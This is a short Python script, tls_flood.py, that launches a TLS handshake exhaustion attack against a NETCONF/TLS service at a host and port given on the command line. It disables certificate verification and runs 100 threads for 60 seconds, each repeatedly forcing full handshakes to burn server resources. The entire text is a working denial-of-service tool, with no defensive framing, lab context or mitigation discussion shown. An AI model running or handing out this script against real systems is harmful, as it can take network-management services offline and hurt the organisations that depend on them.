# tls_flood.py — TLS handshake exhaustion against NETCONF/TLS (pure stdlib, no pip)
import socket, ssl, threading, time, sys
HOST, PORT, DURATION, THREADS = sys.argv[1], int(sys.argv[2]), 60, 100
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE      # we expect auth to fail; the goal is to burn handshakes
stop = time.time() + DURATION
def worker():
    while time.time() < stop:
        try:
            raw = socket.create_connection((HOST, PORT), timeout=3)
            s = ctx.wrap_socket(raw, server_hostname=HOST)   # forces a full TLS handshake
            s.close()
        except Exception:
            pass
for _ in range(THREADS):
    threading.Thread(target=worker, daemon=True).start()
time.sleep(DURATION)